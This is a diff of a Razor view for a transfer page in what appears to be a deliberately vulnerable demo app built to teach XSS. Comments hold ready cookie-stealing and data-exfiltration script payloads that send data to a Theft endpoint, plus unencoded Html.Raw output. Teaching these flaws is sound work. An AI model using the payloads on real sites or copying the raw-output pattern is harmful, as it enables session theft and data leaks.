@@ -1,30 +1,57 @@
 ﻿@model BatcoinMarket.Models.TransferViewModel
 
 @{
-    ViewBag.Title = "Batcoins transfer";
+    ViewBag.Title = "Batcoin transfer";
 }
 
-<div class="jumbotron">
+<div class="jumbotron row">
     <h2>@ViewBag.Title</h2>
-    @using (Html.BeginForm("Transfer", "Home", FormMethod.Post))
-    {
+    <div class="col-md-8 ">
+        @using (Html.BeginForm("Transfer", "Home", FormMethod.Post))
+        {
+            <div class="form-group">
+                @Html.LabelFor(x => x.Amount)
+                <div class="form-inline">
+                    @Html.TextBoxFor(x => x.Amount, new { @class = "form-control input-lg col-md-6" })
+                    @Html.ValidationMessageFor(x => x.Amount, "", new { @class = "text-danger col-md-6" })
+                </div>
+            </div>
+            <br />
+            <div class="form-group">
+                @Html.LabelFor(x => x.To)
+                <div class="form-inline">
+                    @Html.DropDownListFor(x => x.To, Model.GetAccountsListItems(), new { @class = "form-control col-md-6" })
+                    @Html.ValidationMessageFor(x => x.To, "", new { @class = "text-danger col-md-6" })
+                </div>
+            </div>
+            <br />
+            <button type="submit" class="btn btn-lg btn-primary">GO ></button>
+        }
+    </div>
+    <div class="col-md-4">
+        <p class="text-warning">
+            <b>Accounts:</b>
+            <ul>
+                @* XSS consequences *@
 
-        <div class="form-group">
-            @Html.LabelFor(x => x.Amount)
-            <div class="form-inline">
-                @Html.TextBoxFor(x => x.Amount, new {@class = "form-control input-lg col-md-6"})
-                @Html.ValidationMessageFor(x => x.Amount, "", new {@class = "text-danger col-md-6"})
-            </div>
-        </div>
-        <br/>
-        <div class="form-group">
-            @Html.LabelFor(x => x.To)
-            <div class="form-inline">
-                @Html.DropDownListFor(x => x.To, Model.GetAccountsListItems(), new {@class = "form-control col-md-6"})
-                @Html.ValidationMessageFor(x => x.To, "", new {@class = "text-danger col-md-6"})
-            </div>
-        </div>
-        <br />
-        <button type="submit" class="btn btn-lg btn-primary">GO ></button>
-    }
+                @foreach (var account in Model.Accounts)
+                {
+                    @Html.FormatAccount(account)
+                }
+            </ul>
+        </p>
+    </div>
 </div>
+
+@* Stealing cookies or other data *@
+@* @Html.Raw(account.Username) *@
+@* Steal cookies: Joker<script>$(function () { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(document.cookie)).appendTo('body').hide(); });</script> *@
+
+@* Steal sensetive info: Joker<script>$(function () { $.get('/Home/GetSensetiveInfo', function (res) { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(res.data)).appendTo('body').hide(); }); });</script> *@
+
+@* Insecure helpers *@
+@* @Html.FormatUserName(account)*@
+
+@* <li>@account.Username - @account.Balance
+        @Html.ActionLink("✘", "Delete", "Admin", new { username = account.Username }, null)
+    </li>*@
